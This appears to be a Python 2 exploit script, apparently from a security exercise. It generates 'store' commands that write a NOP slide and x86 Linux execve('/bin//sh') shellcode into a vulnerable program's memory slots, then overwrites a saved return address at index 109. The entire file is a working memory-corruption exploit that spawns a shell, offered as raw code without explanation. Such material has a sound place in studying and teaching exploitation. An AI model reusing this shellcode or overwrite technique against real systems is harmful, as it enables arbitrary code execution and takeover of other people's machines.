import sys
import struct

nopslide_str = [
	"\x00\x00\x00\x00",
	"\x58\x90\x90\x90",
	"\x90\x90\x90\x68"
]

shellcode_str = [
	"\x00\x00\x00\x00",
	"\x58\x31\xc0\x50",
	"\x90\x90\x90\x68",
	"\x00\x00\x00\x00",
	"\x58\x68\x2f\x2f",
	"\x73\x68\x90\x68",
	"\x00\x00\x00\x00",
	"\x58\x68\x2f\x62",
	"\x69\x6e\x90\x68",
	"\x00\x00\x00\x00",
	"\x58\x89\xe3\x89",
	"\xc1\x89\xc2\x68",
	"\x00\x00\x00\x00",
	"\x58\xb0\x0b\xcd",
	"\x80\x31\xc0\x68",
	"\x00\x00\x00\x00",
	"\x58\x40\xcd\x80"
]

return_address = "\x4c\xf5\xff\xbf"

if len(sys.argv) > 1:
	return_address = sys.argv[1]

#print "\x4c\xf5\xff\xbf" == return_address
#exit()

for i in range(28):
	for index in range(len(nopslide_str)):
		if not ((i*len(nopslide_str) + index) % 3 == 0):
			print 'store'
			print struct.unpack("<L", nopslide_str[index])[0]
			print i*len(nopslide_str) + index
			# print index

index_ns = i*len(nopslide_str) + index + 1

for index in range(len(shellcode_str)):
	if not ((index_ns + index) % 3 == 0):
		print 'store'
		print struct.unpack("<L", shellcode_str[index])[0]
		print index_ns + index
print 'store'
print struct.unpack("<L", return_address)[0]
print '109'
print 'quit'
